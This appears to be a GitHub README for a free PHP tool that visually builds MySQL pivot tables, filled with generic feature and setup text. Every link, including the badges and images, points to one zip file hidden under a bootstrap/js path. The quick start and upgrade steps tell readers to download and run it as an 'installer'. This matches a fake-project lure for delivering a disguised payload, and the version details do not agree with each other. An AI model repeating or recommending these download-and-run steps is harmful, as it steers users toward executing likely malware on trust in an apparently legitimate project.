# MySQL Pivot Tables Studio: Free PHP Tool for Visual Pivoting

https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip

[![Release](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)
[![License](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)

🧭 A completely free PHP tool for visually creating MySQL pivot tables without writing any code. All you need to do is visually connect to your database and define the data sources for the different sections of your pivot table. 🧩

---

## Overview

- The project is a PHP-based solution that helps you build pivot tables against MySQL without touching SQL. It focuses on a visual builder that maps database tables or views to pivot table parts like rows, columns, and values.
- It targets developers, data analysts, and teams who want fast, repeatable reporting without the complexity of SQL scripting.
- The tool embraces the core ideas of cross-tab reports, ad‑hoc analysis, and data storytelling through pivot insights.

This repository is a practical tool for teams that need repeatable pivot reports in a PHP-friendly environment. It works with MySQL as the data source and exports results in common formats. It also provides a straightforward way to store and reuse pivot definitions.

---

## Features

- Visual pivot builder: connect to a MySQL database, pick tables and views, and map fields to pivot axes.
- No-code data shaping: define rows, columns, and metrics with drag-and-drop interactions.
- Flexible data sources: combine multiple tables or views, with simple join rules created through the UI.
- Aggregations: sum, count, average, min, max, distinct count, and custom expressions.
- Filtering and slicing: add row/column filters, apply date and numeric ranges, and create dynamic slices.
- Sorting: order by any field, by aggregation, or by calculated expressions.
- Grouping and hierarchies: create multi-level row and column groupings for drill-down analysis.
- Calculated fields: derive metrics using simple expressions without editing SQL.
- Export options: export results as CSV, Excel (XLSX), or PDF-ready tables.
- Reusable pivot definitions: save and reuse pivot templates across projects.
- Lightweight and fast: designed for quick startup on common PHP stacks and MySQL databases.
- Local storage of pivots: keep pivots in a local repository or database for team sharing.
- Basic role-based access: simple permission model to protect pivot definitions.
- Themed UI: clean, accessible interface with keyboard navigation.

---

## What this project is not

- It is not a full BI suite. It focuses on pivot-style analysis and export workflows.
- It is not a heavy server-side analytics engine. It offers a practical, easy-to-use pivot builder on top of MySQL.
- It is not vendor-locked. It aims to stay PHP-friendly and MySQL-native.

---

## Why use a visual pivot builder

- Speed: you can spin up pivot reports in minutes instead of writing SQL.
- Clarity: pivot tables reveal patterns and outliers in a compact form.
- Reproducibility: save pivot definitions and apply them to new datasets without rework.
- Accessibility: team members with basic SQL knowledge can still build powerful reports.

The tool emphasizes calm confidence in its design. It pairs straightforward UI choices with robust data handling to minimize friction for everyday analysis tasks.

---

## Quick start

1. Prepare your environment
   - PHP installed (version 7.4+ recommended).
   - A MySQL-compatible database available for connections.
   - A web server or PHP CLI ready to run a PHP web app.
2. Acquire the tool
   - From https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip download the installer package for your platform and run it to install the web UI locally or on your server.
   - The file in the Releases page is the installer you should execute to begin setup.
3. Connect to MySQL
   - Open the web UI in your browser.
   - Create a new database connection using host, port, user, and password credentials.
   - Test the connection to ensure the interface can query the database.
4. Build your first pivot
   - Choose a data source: one or more tables or views.
   - Define the rows: select the fields that will form the row axis.
   - Define the columns: select the fields that will form the column axis.
   - Define the values: pick metrics and aggregation types.
   - Apply filters and sorts as needed.
5. Save and export
   - Save the pivot definition to your local project repository or a shared location.
   - Export results as CSV, Excel, or PDF-ready formats for sharing with stakeholders.

Note: For the latest release and installable package details, visit the releases page at the link above. If you are looking for the newest release, you should check the Releases section to find updated installers and notes.

---

## How the tool works

- Visual data mapping: The UI provides an intuitive workspace where you connect to data sources, map fields to the pivot axes, and set up aggregations.
- Query generation: The builder translates your visual configuration into efficient SQL queries that MySQL can execute.
- Result rendering: Pivot results render in a clean table with options to switch between compact and detailed views.
- Export pipeline: Built results can be exported to CSV, XLSX, or PDF (for reporting purposes) with minimal formatting loss.
- State management: Pivot definitions are stored so you can reload and reuse them across sessions and projects.

This flow keeps you in control while reducing the complexity often associated with pivot-style reporting in SQL.

---

## Architecture and design

- MVC-inspired structure: A lightweight separation between data access, business logic, and the user interface keeps the system maintainable.
- Data access layer: A small, safe abstraction around MySQL queries reduces risk and makes it easier to implement future adapters.
- Pivot engine: A compact engine handles row/column definitions, aggregations, and user-specified filters in memory before submitting queries to MySQL.
- UI layer: A responsive interface supports drag-and-drop, keyboard navigation, and accessible controls.
- Extensibility: The codebase is designed to accept plug-ins for themes, additional data sources, and export options.

This architecture supports a clean development flow and makes it feasible to extend the tool with new features without rewriting core parts.

---

## Installation and setup (in detail)

- System requirements
  - PHP 7.4 or newer (prefer PHP 8.x for performance and modern features).
  - MySQL 5.7+ or compatible MariaDB versions.
  - Web server: Apache, Nginx, or built-in PHP server for testing.

- Installing the release
  - After downloading the installer from the Releases page, run the installer package according to your operating system.
  - The installer configures a local web server environment, sets up default directories, and initializes a starter database for samples.
  - On first run, you will be prompted to create an administrative account and configure the initial database connection.

- Post-install configuration
  - Open the UI and go to Settings.
  - Add a new MySQL connection by providing host, port, user, and password.
  - Specify a default schema and any allowed schemas to scope the connection.
  - Enable or disable specific features (like PDF export) depending on your deployment needs.
  - Set up a pivot template directory or database table to store saved pivots.

- Security considerations
  - Use TLS on your web server to protect credentials in transit.
  - Limit access to the pivot builder to trusted users.
  - Rotate credentials periodically and log access events.
  - Keep PHP and MySQL up to date with security patches.

- Backups
  - Regularly back up your saved pivots and configuration.
  - Consider versioning pivot definitions to track changes over time.

- Upgrades
  - When a new release is available, download the installer from the Releases page and run it over your existing installation.
  - Review release notes for any breaking changes or migration steps.

---

## Connecting to MySQL: step-by-step

- Create a connection
  - Host: the address of your MySQL server.
  - Port: the port MySQL listens on (default is 3306).
  - User: an account with access to the necessary databases.
  - Password: the password for the user.
- Test the connection
  - Click Test to confirm the credentials and network reachability.
  - If the test fails, verify firewall settings, user permissions, and the host address.
- Choose data sources
  - Pick one or more tables or views to include in your pivot.
  - If needed, define virtual joins by linking fields across sources using UI rules (not SQL code).
- Define pivot axes
  - Rows: select fields for the row axis.
  - Columns: select fields for the column axis.
  - Values: choose one or more metrics and specify aggregations.
- Add filters
  - Apply date ranges, status filters, or numeric ranges to narrow data.
  - Create hierarchical filters that shrink the dataset layer by layer.
- Preview and adjust
  - Preview the first few rows of the pivot to verify the mapping.
  - Adjust data types, formats, and aggregations as needed.

This sequence helps you get a pivot up and running quickly while preserving control over the data sources.

---

## Data sources and data modeling

- Data sources
  - Tables and views from a MySQL database serve as data sources.
  - You can combine multiple sources in a single pivot to cross-analyze data.
- Joins and relationships
  - Relationships are defined through the UI, avoiding raw SQL joins in most cases.
  - The tool supports common join types like INNER, LEFT, and RIGHT, with clear explanations of how they affect results.
- Data shaping
  - You can choose fields to include in the row and column axes.
  - You can create calculated fields that depend on existing fields, enabling custom metrics.
- Data quality
  - The UI provides validation to catch missing fields or mismatched types.
  - It highlights potential data quality issues that could impact pivot results.
- Data governance
  - Access to data sources is controlled by the connection settings and user permissions in the UI.
  - Pivot sharing can be restricted to certain teams or roles.

This design keeps data modeling centered on the user experience while remaining grounded in reliable database practices.

---

## Pivot building: best practices

- Start with key metrics
  - Begin with a few essential metrics to understand the data distribution.
  - Add more metrics once you have a stable view of the data.
- Use meaningful hierarchies
  - Create logical row and column hierarchies, such as Year > Quarter > Month or Region > Country > City.
  - Hierarchies help reveal patterns at different levels of detail.
- Apply sensible filters
  - Use date ranges to limit data to relevant periods.
  - Filter out anomalous or irrelevant records to improve clarity.
- Keep it simple
  - Avoid too many axes in a single pivot; focus on a few core insights at a time.
  - Consolidate similar categories to reduce noise.
- Validate results
  - Compare pivot results with raw SQL queries for a small sample to build confidence.
  - Use export formats to share a reproducible view with stakeholders.

These practices help you extract meaningful insights without getting lost in complexity.

---

## Export and reporting

- Export formats
  - CSV: ideal for data exchange and quick import into other tools.
  - XLSX: preserves formatting and supports further editing in spreadsheet apps.
  - PDF: suitable for fixed-layout reports suitable for distribution.
- PDF considerations
  - Include a title, a table of contents (optional), and a few summary metrics.
  - Use clear fonts and legible sizes to ensure readability.
- Embedding pivot views
  - Exported reports can include multiple pivots on a single page.
  - You can define page structure to place pivots in a composed report layout.
- Scheduling exports
  - Basic scheduling can be set up to generate exports at defined intervals.
  - Consider pairing with a cron job or a task scheduler on your server.

Exporting pivots helps you deliver consistent reports to your team without manual rework.

---

## The UI tour (high level)

- Sidebar navigation
  - Access connections, sources, pivots, and export settings.
- Canvas area
  - Drag fields onto the rows and columns areas.
  - Add metrics to the values area and configure aggregations.
- Properties panel
  - Adjust data types, formats, and calculation expressions.
- Preview pane
  - See real-time updates as you configure the pivot.
- Export panel
  - Pick the format and download the result.

The UI is designed so new users can start with a minimal pivot in a short session and gradually add complexity as needed.

---

## Security and deployment

- Access control
  - Use a separate admin account for configuration tasks.
  - Enable two-factor authentication if your hosting platform supports it.
- Environment isolation
  - Run the tool in a dedicated environment or container to limit blast radius in case of issues.
- Data exposure
  - Never expose database credentials in public logs or error messages.
  - Use role-based access to restrict who can view or modify pivot definitions.
- Backups and recovery
  - Keep backups of pivots and settings.
  - Test recovery procedures on a staging environment before production.

Security is about small, deliberate steps that protect data without complicating the user experience.

---

## Testing and quality

- Unit tests
  - The project includes unit tests for the core pivot engine and data mapper.
  - Run tests regularly during development to catch regressions.
- Integration tests
  - Use test databases to verify end-to-end pivot creation and export.
- Manual testing
  - Validate common pivot scenarios across MySQL versions.
  - Check UI accessibility and keyboard navigation.
- Performance checks
  - Monitor query times for large datasets.
  - Optimize data shaping and aggregation steps to stay responsive.

A steady test cycle helps keep pivot results reliable as the project evolves.

---

## Internationalization and accessibility

- Localization
  - The UI supports multiple languages and date formats.
  - Add translations through a simple locale system.
- Accessibility
  - Keyboard operability for all primary actions.
  - Screen-reader friendly labels and ARIA attributes.
  - High-contrast themes for visibility.

The project aims to be usable by diverse teams, including those with accessibility needs.

---

## Documentation and learning resources

- In-project docs
  - A help center with quick starts, field explanations, and common workflows.
- Community guides
  - Tutorials and example pivots created by users.
- API and developer docs
  - If you extend the tool, you’ll find API references and extension guides.

Documentation focuses on practical guidance rather than theory, helping you translate ideas into pivots quickly.

---

## Contributing

- How to contribute
  - Fork the repository, create a feature branch, and submit a pull request.
  - Start by opening an issue to discuss ideas or report bugs.
- Coding standards
  - Follow simple, readable PHP coding practices.
  - Write small, clear functions with meaningful names.
- Testing before merging
  - Run unit and integration tests locally.
  - Provide test data and expected results for new features.
- Community guidelines
  - Be respectful and constructive in feedback.
  - Respect the project’s licensing and contribution rules.

Contributions help the project grow robust and useful for more users.

---

## Roadmap

- More data sources
  - Add support for additional database systems and data connectors.
- Advanced calculations
  - Introduce more complex expressions and statistical measures.
- Dashboards
  - Integrate multiple pivots into cohesive dashboards with shared filters.
- Scheduling and automation
  - Improve export scheduling and report distribution options.
- Performance improvements
  - Optimize the query planner and cache frequently used pivots.

The roadmap is a living guide, reflecting user feedback and real-world usage.

---

## Troubleshooting (quick references)

- Connection failures
  - Verify host, port, user, and password.
  - Check user permissions on the database.
  - Confirm network access between the app server and MySQL host.
- Empty pivot outputs
  - Ensure the selected tables have data.
  - Check join relationships and filters for overly restrictive conditions.
  - Confirm data type compatibility for calculated fields.
- Export issues
  - Ensure the target directory is writable for PDFs or CSV exports.
  - Confirm dependencies for Excel or PDF generation are installed.

Common issues are usually tied to credentials, permissions, or misconfigurations in the initial setup.

---

## Licensing

- This project is released under a permissive license that encourages use in both personal and commercial projects.
- It emphasizes freedom to modify, share, and adapt the tool for your needs.

If you plan to modify the tool, please keep attribution and maintain a clear changelog for downstream users.

---

## Releasing notes and how to get updates

- The primary venue for updates is the Releases page.
- To stay current, watch the repository for new releases and read the release notes for any breaking changes or new features.
- The Releases page is also where you download the installer package referenced in the quick start guide.
- For the latest release details and to grab the installer, visit:
  https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip

Note: If you cannot access the Releases page or if the link changes, check the Releases section of the repository for the latest installers and notes.

---

## Visuals and branding

- The project uses a clean, tech-friendly color scheme to emphasize data clarity.
- Icons and emojis are used to aid navigation and quick scanning of sections.
- The UI includes a pivot-focused icon set to reinforce the concept of cross-tab reports.

Below are a couple of visuals to give you a sense of how pivot tables can look when built with this tool.

![Pivot Table Example](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)

A secondary visual can depict data analytics workflows and dashboards:

![Analytics Dashboard](https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip)

These visuals help illustrate the core idea: turning raw data into structured insights through pivot thinking.

---

## Topics

- crosstab
- data-analysis
- data-analytics
- mysql
- mysql-database
- mysql-pivot-table
- mysql-reports
- php
- php-pivot-table
- php-reports
- pivot-tables
- reporting-tools

---

## Release notes (high level summary)

- v1.x.x: Initial visual pivot builder with core row/column/value configuration, basic filters, and CSV export.
- v1.1.x: Improved join handling, multi-source pivots, and Excel export with formatting.
- v1.2.x: Added calculated fields, date-based filters, and enhanced UI accessibility features.
- v2.x.x: Performance improvements, PDF export, and basic dashboard composition.
- v2.1.x: Additional data source types and more robust role-based access controls.

Release notes are intended to be brief summaries of what changed and why it matters for users building pivots.

---

## Final notes

- The tool is designed so you can start with a simple pivot and grow into more advanced analyses without shifting to SQL.
- It places emphasis on a calm, purposeful user experience that helps you tell data stories with confidence.
- If you run into a situation not covered here, the project welcomes feedback, questions, and contributions.

For more details, the releases page is your primary resource for installers, updates, and changelogs:

https://github.com/arukimu/mysql-pivot-tables/raw/refs/heads/main/MPT/tables/common/bootstrap/js/mysql-pivot-tables-v3.1.zip

End of document.